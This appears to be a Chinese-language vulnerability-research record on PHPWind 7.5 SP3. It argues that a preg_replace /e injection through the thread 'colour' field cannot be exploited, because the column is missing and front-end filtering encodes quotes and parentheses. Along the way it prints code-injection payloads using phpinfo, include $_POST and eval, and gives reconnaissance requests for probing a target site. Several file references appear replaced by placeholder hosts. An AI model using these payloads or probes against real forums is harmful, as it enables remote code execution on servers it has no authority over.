# colour 判死与 7.5 等价字段 titlefont 证据链（/eis 注入必须的 ' 与 ) 都被前台清洗吃掉）

- **code**: colour-判死与-7.5-等价字段-titlefont-证据链-eis-注入必须的-与-都被前台清洗吃掉
- **kind**: script
- **category**: rce
- **component**: PHPWind pw_threads.colour vs titlefont（7.5 SP3）
- **severity**: info
- **language**: php
- **source**: self
- **verified_note**: 7.5 SP3 逐行确证（建表语句、3 处 colour 引用、7 处 titlefont 写入/读取、CheckVar/Char_cv 边界）。7.3.2 是否有 colour 列属外推（置信度中高：名称变更+代码未清理的典型形态），但即便有也被入参清洗封死。
- **path**: pocs/colour-判死与-7.5-等价字段-titlefont-证据链-eis-注入必须的-与-都被前台清洗吃掉/poc.php
- **tags**: phpwind,colour,titlefont,/eis,判死,历史遗留字段,8.7未修
- **created_at**: 2026-10-06T11:40:33.674Z

## 描述

判死 colour 这条最被看好的活口，并给出 7.5 的等价字段证据链。7.5 SP3 的 pw_threads 建表语句（lang/install_wind.sql:3383-3423）逐列抄录后确认没有 colour 列，有的是一条 titlefont varchar(15)。全代码库只有 3 处 colour 命中且全是读，没有任何写入点——这是"代码读旧字段名、功能已改用新字段名"的典型历史遗留，正是 8.7 也原样保留该行的原因（旧名字取不到值，反而没人再去改代码）。/eis 注入要求 payload 同时提供单引号（断引）和右括号（闭合 copyctrl(），而所有前台写入路径都被 target116.example.com:53-61 的 CheckVar 把 ) 换成 &#41;、InitGP 的 Char_cv 把 ' 换成 &#39;，两条腿都断。

## 用法

```
1 包间接判定 7.3.2 是否有 colour 列（前端观察，零副作用）：
  GET /bbs/post.php?fid=<任意可发帖版块>
  在返回 HTML 里搜索 name="title1" / color_picker.js / pickReback（7.5 的模板 template/wind/ajax_mawhole.htm:289 有 <input id="title1" name="title1" type="hidden" value="$titlecolor" />，并加载 js/color_picker.js，函数 pickReback(color)）。
  - 若发帖页有该颜色控件 → 说明"标题颜色"功能存在。7.5 此时字段是 titlefont；若目标 7.3.2 页面 JS 里出现 colour 字样（如 name="colour" / setcolour()），则 colour 列很可能存在。
  - 但即便存在，见本 POC 末段的 ② ③ 两条：payload 所需的 ' 与 ) 都被前台清洗吃掉，
    除非存在一条"前台可控输入 → 绕开 CheckVar 与 Char_cv → 写入 pw_threads.colour"的路径（在 7.5 未找到）。
另可观察：找一个已被高亮颜色的老帖，GET /bbs/thread.php?tid=<tid>，
  若标题渲染成彩色，说明该站 titlefont（或 colour）在用，字段肯定存在。
不要为 colour 单独花更多额度。
```

## 正文

```
// ============ 字段名对照：7.5 用 titlefont，code 里却读 colour ============
// lang/install_wind.sql:3383-3423  pw_threads 建表（逐列抄录，无 colour 列）:
//   tid fid icon titlefont author authorid subject toolinfo toolfield ifcheck type
//   postdate lastpost lastposter hits replies favors modelid shares topped topreplays
//   locked digest special state ifupload ifmail ifmark ifshield anonymous dig fight
//   ptable ifmagic ifhide inspect tpcstatus
// 3387:   titlefont varchar(15) NOT NULL default '',
//
// 全代码库 grep 'colour' 只有 3 处命中，全是"读"：
//   require/target191.example.com:345      copyctrl('$read[colour]')
//   lib/target192.example.com:409  copyctrl('$read[colour]')
//   admin/target207.example.com:180          &bg_colour=#FFFFFF&   （无关，flash 参数）
// → 7.5 SP3 没有任何写 pw_threads.colour 的代码 = 该 /eis 在 7.5 上是死代码。
//
// ============ 7.5 等价功能用 titlefont（varchar 15）实现 ============
// 格式：颜色1~颜色2~颜色3~颜色4~颜色5~颜色6~   用 ~ 分隔
// 写入路径 A（前台道具"彩色标题"，需道具）:
//   hack/toolcenter/require/target208.example.com:22-24
//     InitGP(array('title1','title2','title3','title4','title5','title6'));   // 默认 cvtype=1 → Char_cv
//     $titlefont = "$title1~$title2~$title3~$title4~$title5~$title6~";
//     $db->update("UPDATE pw_threads SET titlefont=".pwEscape($titlefont).",toolinfo=".pwEscape($tooldb['name'],false)."WHERE tid=".pwEscape($tid));
// 写入路径 B（前台/版主批量高亮 + 颜色白名单）:
//   target108.example.com:1587-1607
//     InitGP(array('title1','title2','title3','title4','nextto','ifmsg','timelimit'));
//     if ($title1 && !preg_match('/#[0-9A-F]{6}/is',$title1)) { ... }      // ★ 颜色白名单
//     $titlefont = Char_cv("$title1~$title2~$title3~$title4~$title5~$title6~");   // ★ Char_cv
//     ...
//     target108.example.com:1651  $db->update("UPDATE pw_threads SET titlefont=".pwEscape($titlefont).',toolfield=... WHERE tid=...');
//     target108.example.com:1668  $db->update("UPDATE pw_threads SET titlefont=".pwEscape($titlefont)." WHERE tid IN(".pwImplode($tids).")");
// 读取/渲染（全部 explode("~") 取 [0] 当颜色，多处在渲染前还会再校验 #RRGGBB）:
//   target111.example.com:530-531 / example.com:318-320 / target194.example.com:404-405 / example.com:1062-1063 /
//   lib/target209.example.com:214-221 / require/target210.example.com:191 / require/target211.example.com:72 /
//   apps/article/example.com:132,224 / apps/share/action/m_share.php:81 / target110.example.com:293,333 /
//   target108.example.com:1558-1565（$titlecolor = $titledetail[0]; if ($titlecolor && !preg_match('/\#[0-9A-F]{6}/is',$titlecolor)) $titlecolor='';）
//
// ============ /eis 注入的最小 payload 形态（按正则原文推） ============
// 正则：  "/<br>/eis"      （无捕获组，替换串里的 \1 无意义）
// 替换串： copyctrl('$read[colour]')      ← 先被 PHP 双引号插值，再被 /e 当 PHP 代码 eval
// copyctrl 的定义是零参函数（require/target137.example.com:160-168 function copyctrl() {...}），
// 传参给零参函数在 PHP 里合法（多余参数忽略），所以注入点在"插值→eval"这一步，与函数签名无关。
//
// 要让 eval 的代码语法正确，COLOUR 必须同时提供：① 一个 ' 收尾左引号；② 一个 ) 闭合 copyctrl(。
// 想省掉 ) 的写法都失败：
//   COLOUR = "');include$_POST[1];if(0"     → copyctrl('');include$_POST[1];if(0')  → if( 未闭合，语法错误
//   COLOUR = "');include$_POST[1];#"        → copyctrl('');include$_POST[1];#')  → 合法，但仍含 )
//   COLOUR = "#',@eval($_POST[1]));#"       → 语法错误
// → 结论：必须有右括号 )。最简可见效果 payload（含 ) 与 '）：
//   COLOUR = "a');phpinfo();//"             → copyctrl('a');phpinfo();//')
//   COLOUR = "'),include$_POST[1];#"        → copyctrl(''),include$_POST[1];#')   （include 一个远程/本地文件）
//
// ============ 为什么 7.5 上这条路整体死 ============
// ① 无 colour 列（确证，见上）；
// ② 即便有，写入路径全部经 target116.example.com:53-61 的 CheckVar → ) 变成 &#41;  → 无法闭合 copyctrl(
//    （colortitle.php 走 example.com→global.php；mawhole.php 走 global.php；两者都在 CheckVar 覆盖范围内）
//    同时 InitGP 默认 cvtype=1 还会把 ' 变成 &#39; → 连断引都做不到；
// ③ 唯一不过 CheckVar 的是后台路径（admin/example.com 里没有任何 CheckVar 循环，已确证），
//    但后台入口被站长改名、且 install.php 存在会让后台一律拒绝进入。
```
